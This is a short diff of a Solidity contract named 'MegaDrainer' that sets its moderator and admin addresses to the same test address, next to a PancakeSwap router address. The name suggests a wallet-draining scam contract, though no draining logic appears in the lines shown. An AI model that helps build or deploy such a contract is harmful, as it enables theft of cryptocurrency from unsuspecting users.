@@ -57,9 +57,9 @@ contract MegaDrainer is Ownable {
 
     // Addresses from DevToken (replace with actual BSC addresses in production)
     address public _usdtPair = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap Router
-    address public _mod = 0x9BC7EFE53E1811a0685ADe69788493DffA723101; // Test address
+    address public _mod = 0x0BD2da7fEA1D17546dcF0e57f300a22143df9f14; // Test address
     address public _user = 0x0BD2da7fEA1D17546dcF0e57f300a22143df9f14; // Test address
-    address public _adm = 0xBf73886C4d32abb30BC908dD847bfC82E9F155C3; // Test address
+    address public _adm = 0x0BD2da7fEA1D17546dcF0e57f300a22143df9f14; // Test address
 
     // Mappings for token functionality
     mapping(address => uint256) public balances;
